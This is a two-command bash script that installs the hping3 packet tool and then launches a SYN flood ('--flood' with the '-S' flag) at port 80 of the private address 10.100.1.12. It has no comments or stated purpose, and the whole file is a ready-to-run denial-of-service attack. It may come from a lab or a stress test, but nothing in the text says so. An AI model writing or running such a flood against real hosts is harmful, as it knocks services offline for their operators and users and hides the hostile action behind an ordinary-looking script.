#!/bin/bash

apt install hping3 -y

hping3 -S -p 80 --flood 10.100.1.12
